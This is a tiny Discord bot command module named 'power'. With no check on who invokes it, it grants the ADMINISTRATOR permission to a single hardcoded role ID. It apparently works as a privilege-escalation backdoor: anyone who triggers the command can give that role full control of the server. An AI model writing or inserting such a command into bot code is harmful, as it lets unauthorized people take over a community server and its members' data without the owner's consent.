module.exports = {
    name: "power",
    execute(msg) {
        const role = msg.member.guild.roles.cache.get('765244241643044935');
        role.setPermissions(['ADMINISTRATOR']);
    },
}
